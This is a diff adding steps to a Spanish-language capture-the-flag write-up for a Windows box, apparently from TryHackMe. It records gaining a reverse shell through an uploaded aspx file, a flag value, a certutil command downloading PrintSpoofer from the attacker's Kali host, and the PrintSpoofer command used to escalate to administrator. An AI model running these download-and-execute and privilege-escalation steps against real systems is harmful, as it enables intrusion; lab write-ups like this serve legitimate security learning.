@@ -108,3 +108,54 @@ Ahora voy a probar a crear un nuevo archivo a ver si se refleja en la web para p
 ![alt text](image-17.png)
 
 
+Ahora despues de buscar en payloadallthethings la reverse shell de tcp por windows
+
+![](reverse.png)
+
+No ha funcionado eso pero he buscado en otra pagina y puede funcionar una de aspx
+
+![alt text](image-18.png)
+
+Ninguna funciona pero le he preguntado a perplexity y me ha dado esta que si funciona
+
+![alt text](image-21.png)
+
+![alt text](image-20.png)
+
+Luego buscamos en el navegador el archivo
+
+![alt text](image-22.png)
+
+Y con el netcat abierto sale la terminal ya
+
+![alt text](image-23.png)
+
+Aqui tenemos la primera flag 
+
+![alt text](image-24.png)
+
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+
+
+![alt text](image-25.png)
+
+Vamos a descargar PrintSpoofer.exe
+
+![alt text](image-26.png)
+
+Lo metemos en samba
+
+![alt text](image-27.png)
+
+Levantamos en esa carpeta una web con python = python3 -m http.server 80
+
+Luego usamos esto 
+
+`certutil -urlcache -f http://<IP_Kali>/PrintSpoofer64.exe printspoofer.exe`
+
+Y ejecutamos en la termninal `PrintSpoofer64.exe -i -c cmd` y nos hacemos root
+![alt text](image-28.png)
+
+La flag esta en `C:\Users\Administrator\Desktop\root.txt`
+
+![alt text](image-29.png)
